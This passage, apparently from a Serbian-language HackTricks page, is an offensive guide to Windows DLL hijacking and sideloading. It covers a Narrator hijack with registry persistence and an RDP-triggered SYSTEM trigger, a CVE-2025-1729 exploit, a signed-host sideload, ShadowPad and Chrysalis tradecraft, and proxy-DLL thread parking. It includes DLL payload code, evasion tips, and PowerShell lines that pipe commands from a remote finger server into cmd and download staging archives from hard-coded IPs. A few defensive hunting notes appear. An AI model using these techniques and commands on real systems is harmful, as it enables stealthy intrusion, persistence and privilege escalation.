- Pokrenite Narrator i posmatrajte pokušaj učitavanja navedene putanje.

Minimalni DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC tišina
- Naivni hijack će govoriti/istaknuti UI. Da biste ostali nečujni, prilikom attach-a enumerišite Narrator thread-ove, otvorite glavni thread (`OpenThread(THREAD_SUSPEND_RESUME)`) i suspendujte ga pomoću `SuspendThread`; nastavite u sopstvenom thread-u. Pogledajte PoC za kompletan kod.<sup>[[8]](#references)</sup>

Trigger i persistence putem Accessibility konfiguracije
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Nakon navedenog, pokretanje Narrator-a učitava postavljeni DLL. Na secure desktop-u (logon screen), pritisnite CTRL+WIN+ENTER da pokrenete Narrator; vaš DLL se izvršava kao SYSTEM na secure desktop-u.

RDP-triggered SYSTEM izvršavanje (lateral movement)
- Dozvolite klasični RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Povežite se na host putem RDP-a, na logon screen-u pritisnite CTRL+WIN+ENTER da pokrenete Narrator; vaš DLL se izvršava kao SYSTEM na secure desktop-u.
- Izvršavanje se zaustavlja kada se RDP session zatvori—izvršite inject/migrate bez odlaganja.

Bring Your Own Accessibility (BYOA)
- Možete klonirati registry entry ugrađenog Accessibility Tool-a (AT) (npr. CursorIndicator), izmeniti ga tako da pokazuje na proizvoljni binary/DLL, importovati ga, a zatim postaviti `configuration` na ime tog AT-a. Na ovaj način se proizvoljno izvršavanje prosleđuje kroz Accessibility framework.

Napomene
- Upisivanje u `%windir%\System32` i menjanje HKLM vrednosti zahteva admin prava.
- Celokupna payload logika može da se nalazi u `DLL_PROCESS_ATTACH`; exports nisu potrebni.

## Studija slučaja: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ovaj slučaj prikazuje **Phantom DLL Hijacking** u Lenovo TrackPoint Quick Menu-u (`TPQMAssistant.exe`), evidentiran kao **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Detalji ranjivosti

- **Komponenta**: `TPQMAssistant.exe` se nalazi u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se izvršava svakog dana u 9:30 u kontekstu ulogovanog user-a.
- **Directory Permissions**: `CREATOR OWNER` ima dozvolu za upis, što lokalnim user-ima omogućava da postave proizvoljne fajlove.
- **DLL Search Behavior**: Pokušava da učita `hostfxr.dll` prvo iz svog working directory-ja i beleži "NAME NOT FOUND" ako nedostaje, što ukazuje na prioritet lokalnog directory search-a.

### Implementacija exploita

Attacker može da postavi maliciozni `hostfxr.dll` stub u isti directory, iskorišćavajući DLL koji nedostaje za postizanje code execution-a u kontekstu user-a:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Tok napada

1. Kao standardni korisnik, ubacite `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekajte da se scheduled task pokrene u 9:30 ujutru u kontekstu trenutnog korisnika.
3. Ako je administrator prijavljen kada se task izvrši, malicious DLL se pokreće u sesiji administratora sa medium integrity nivoom.
4. Povežite standardne UAC bypass tehnike kako biste prešli sa medium integrity nivoa na SYSTEM privilegije.

## Studija slučaja: MSI CustomAction Dropper + DLL Side-Loading putem Signed Host-a (wsc_proxy.exe)

Threat actors često kombinuju MSI-based droppers sa DLL side-loading tehnikom kako bi izvršili payload unutar trusted, signed procesa.<sup>[[10]](#references)</sup>

Pregled lanca
- Korisnik preuzima MSI. CustomAction se nečujno pokreće tokom GUI instalacije (npr. LaunchApplication ili VBScript action) i rekonstruiše sledeću fazu iz embedded resources.
- Dropper upisuje legitiman, signed EXE i malicious DLL u isti direktorijum (primer para: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Kada se signed EXE pokrene, Windows DLL search order prvo učitava wsc.dll iz working direktorijuma, izvršavajući attacker kod unutar signed parent procesa (ATT&CK T1574.001).

MSI analiza (na šta obratiti pažnju)
- CustomAction tabela:
- Potražite entries koji pokreću executables ili VBScript. Sumnjiv primer pattern-a: LaunchApplication koji izvršava embedded file u pozadini.
- U Orca (Microsoft Orca.exe), pregledajte CustomAction, InstallExecuteSequence i Binary tabele.
- Embedded/split payloads u MSI CAB-u:
- Administrativno izdvajanje: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ili koristite lessmsi: lessmsi x package.msi C:\out
- Potražite više malih fragmenata koji se spajaju i dešifruju putem VBScript CustomAction-a. Uobičajeni tok:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktični sideloading sa wsc_proxy.exe
- Stavite ove dve datoteke u isti folder:
- wsc_proxy.exe: legitimni potpisani host (Avast). Proces pokušava da učita wsc.dll po imenu iz svog direktorijuma.
- wsc.dll: DLL napadača. Ako nisu potrebni određeni exports, DllMain može biti dovoljan; u suprotnom, napravite proxy DLL i prosledite potrebne exports autentičnoj biblioteci, dok payload izvršavate u DllMain.
- Napravite minimalni DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Za export zahteve koristite proxying framework (npr. DLLirant/Spartacus) za generisanje forwarding DLL-a koji takođe izvršava vaš payload.

- Ova tehnika se oslanja na rezoluciju DLL imena od strane host binary-ja. Ako host koristi apsolutne putanje ili safe loading flags (npr. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack može da ne uspe.
- KnownDLLs, SxS i forwarded exports mogu uticati na prioritet i moraju se uzeti u obzir prilikom izbora host binary-ja i skupa export-a.

## Potpisani triadi + encrypted payloads (ShadowPad case study)

Check Point je opisao kako Ink Dragon deploy-uje ShadowPad koristeći **tri-file triad** kako bi se stopio sa legitimnim software-om, dok core payload ostaje encrypted na disku:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – zloupotrebljavaju se vendori kao što su AMD, Realtek ili NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Napadači preimenuju executable tako da izgleda kao Windows binary (na primer `conhost.exe`), ali Authenticode signature ostaje validan.
2. **Malicious loader DLL** – drop-uje se pored EXE-a sa očekivanim imenom (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL je obično MFC binary obfuskovan pomoću ScatterBrain framework-a; njegov jedini zadatak je da pronađe encrypted blob, decrypt-uje ga i reflective map-uje ShadowPad.
3. **Encrypted payload blob** – često se čuva kao `<name>.tmp` u istom direktorijumu. Nakon memory-map-ovanja decrypted payload-a, loader briše TMP file kako bi uništio forensic evidence.

Tradecraft napomene:

* Preimenovanje signed EXE-a (uz zadržavanje originalnog `OriginalFileName` u PE header-u) omogućava mu da se predstavlja kao Windows binary, a da zadrži vendor signature, zato oponašajte naviku Ink Dragon-a da drop-uje binary-je koji izgledaju kao `conhost.exe`, a zapravo su AMD/NVIDIA utilities.
* Pošto executable ostaje trusted, većina allowlisting controls mora samo da dozvoli da vaš malicious DLL bude pored njega. Fokusirajte se na prilagođavanje loader DLL-a; signed parent obično može da se izvršava bez izmena.
* ShadowPad decryptor očekuje da TMP blob bude pored loader-a i writable kako bi mogao da nuluje file nakon map-ovanja. Ostavite direktorijum writable dok se payload ne učita; kada je u memory-ju, TMP file može bezbedno da se obriše radi OPSEC-a.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operatori kombinuju DLL sideloading sa LOLBAS-om, tako da je jedini custom artifact na disku malicious DLL pored trusted EXE-a:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Skriveni PowerShell pokreće `cmd.exe /c`, preuzima commands sa Finger servera i prosleđuje ih u `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` preuzima tekst preko TCP/79; `| cmd` izvršava odgovor servera, omogućavajući operatorima da rotiraju second stage server-side.

- **Built-in download/extract:** Preuzmite archive sa benignim extension-om, raspakujte ga i stage-ujte sideload target zajedno sa DLL-om u random `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` skriva progress i prati redirects; `tar -xf` koristi Windows-ov ugrađeni tar.

- **WMI/CIM launch:** Pokrenite EXE preko WMI-ja, tako da telemetry prikazuje CIM-created process dok on učitava colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funkcioniše sa binary-jima koji preferiraju local DLL-ove (npr. `intelbq.exe`, `nearby_share.exe`); payload (npr. Remcos) izvršava se pod trusted name-om.

- **Hunting:** Upozorite na `forfiles` kada se `/p`, `/m` i `/c` pojavljuju zajedno; takva kombinacija je neuobičajena izvan admin scripts-a.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Nedavni Lotus Blossom intrusion zloupotrebio je trusted update chain za isporuku NSIS-packed dropper-a koji je stage-ovao DLL sideload i potpuno in-memory payloads.<sup>[[13]](#references)</sup>

Tradecraft flow
- `update.exe` (NSIS) kreira `%AppData%\Bluetooth`, označava ga kao **HIDDEN**, drop-uje preimenovani Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` i encrypted blob `BluetoothService`, a zatim pokreće EXE.
- Host EXE import-uje `log.dll` i poziva `LogInit`/`LogWrite`. `LogInit` mmap-load-uje blob; `LogWrite` ga decrypt-uje pomoću custom LCG-based stream-a (konstante **0x19660D** / **0x3C6EF35F**, key material izveden iz prethodnog hash-a), prepisuje buffer plaintext shellcode-om, oslobađa privremene podatke i skače na njega.
- Kako bi izbegao IAT, loader resolve-uje API-je hashovanjem export names-a koristeći **FNV-1a basis 0x811C9DC5 + prime 0x100019**, zatim primenjuje Murmur-style avalanche (**0x85EBCA6B**) i poredi rezultat sa salted target hashes.

Main shellcode (Chrysalis)
- Decrypt-uje PE-like main module ponavljanjem add/XOR/sub operacija sa key-jem `gQ2JR&9;` kroz pet pass-ova, a zatim dinamički učitava `Kernel32.dll` → `GetProcAddress` kako bi završio import resolution.
- Rekonstruiše DLL name strings u runtime-u pomoću per-character bit-rotate/XOR transforms, a zatim učitava `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Koristi drugi resolver koji prolazi kroz **PEB → InMemoryOrderModuleList**, parsira svaki export table u blokovima od 4 byte-a pomoću Murmur-style mixing-a i koristi `GetProcAddress` samo kao fallback ako hash nije pronađen.

Embedded configuration & C2
- Config se nalazi unutar dropped `BluetoothService` file-a na **offset 0x30808** (size **0x980**) i RC4-decrypt-uje se pomoću key-ja `qwhvb^435h&*7`, čime se otkrivaju C2 URL i User-Agent.
- Beacons grade dot-delimited host profile, dodaju tag `4Q` na početak, a zatim ga RC4-encrypt-uju pomoću key-ja `vAuig34%^325hGV` pre `HttpSendRequestA` preko HTTPS-a. Responses se RC4-decrypt-uju i prosleđuju putem tag switch-a (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode se određuje CLI args-ima: bez args = install persistence (service/Run key) koji pokazuje na `-i`; `-i` relaunch-uje samog sebe sa `-k`; `-k` preskače install i pokreće payload.

Alternate loader observed
- U istom intrusion-u drop-ovani su Tiny C Compiler i izvršen je `svchost.exe -nostdlib -run conf.c` iz `C:\ProgramData\USOShared\`, sa `libtcc.dll` pored njega. C source koji je dostavio napadač sadržao je shellcode, kompajliran je i pokrenut in-memory bez upisivanja PE-a na disk. Reprodukujte pomoću:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ova TCC-based compile-and-run faza je u runtime-u importovala `Wininet.dll` i preuzimala second-stage shellcode sa hardkodovanog URL-a, obezbeđujući fleksibilan loader koji se predstavlja kao pokretanje kompilatora.

## Signed-host sideloading sa export proxying + host thread parking

Neki DLL sideloading lanci dodaju **stability engineering** kako bi legitimni host ostao aktivan dovoljno dugo da čisto učita kasnije faze, umesto da se sruši nakon učitavanja malicioznog DLL-a.<sup>[[11]](#references)</sup>

Observed pattern
- Postavite trusted EXE pored malicioznog DLL-a, koristeći očekivani naziv dependency-ja, kao što je `version.dll`.
- Maliciozni DLL **proxy-uje svaki očekivani export** ka pravom system DLL-u, na primer `%SystemRoot%\\System32\\version.dll`, tako da import resolution i dalje uspeva, a host proces nastavlja da radi.
- Nakon učitavanja, maliciozni DLL **patch-uje entry point hosta** tako da se main thread zaglavi u beskonačnoj `Sleep` petlji, umesto da se završi ili izvršava code paths koji bi prekinuli proces.
- Novi thread izvršava stvarni maliciozni rad: dešifruje naziv ili putanju next-stage DLL-a (RC4/XOR su uobičajeni), a zatim ga pokreće pomoću `LoadLibrary`.

Why this matters
- Standardno DLL proxying čuva API kompatibilnost, ali ne garantuje da će host ostati aktivan dovoljno dugo za kasnije faze.
- Parkiranje main thread-a u `Sleep(INFINITE)` je jednostavan način da signed proces ostane rezidentan dok loader obavlja dešifrovanje, staging ili network bootstrap u worker thread-u.
- Hunting usmeren samo na sumnjivi `DllMain` može da propusti ovaj pattern ako se interesantno ponašanje dešava nakon patch-ovanja entry point-a hosta i pokretanja sekundarnog thread-a.

Minimal workflow
1. Kopirajte signed host EXE i utvrdite koji DLL učitava iz lokalnog direktorijuma.
2. Napravite proxy DLL koji export-uje iste funkcije i prosleđuje ih legitimnom DLL-u.
3. U `DllMain(DLL_PROCESS_ATTACH)` kreirajte worker thread.
4. Iz tog thread-a patch-ujte entry point hosta ili main thread start routine tako da se vrti u petlji sa `Sleep`.
5. Dešifrujte naziv/config next-stage DLL-a i pozovite `LoadLibrary` ili izvršite manual-map payload-a.

Defensive pivots
- Signed procesi koji učitavaju `version.dll` ili slične uobičajene biblioteke iz sopstvenog application direktorijuma umesto iz `System32`.
- Memory patches na process entry point-u ubrzo nakon učitavanja image-a, naročito jump/call instrukcije preusmerene na `Sleep`/`SleepEx`.
- Thread-ovi koje kreira proxy DLL i koji odmah pozivaju `LoadLibrary` nad drugim DLL-om sa dešifrovanim nazivom.
- Full-export proxy DLL-ovi postavljeni pored vendor executable fajlova unutar writable staging direktorijuma, kao što su `ProgramData`, `%TEMP%` ili putanje do unpacked archive fajlova.

## References

- [1] [Red Canary – Intelligence Insights: januar 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking in Windows. Simple C example.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
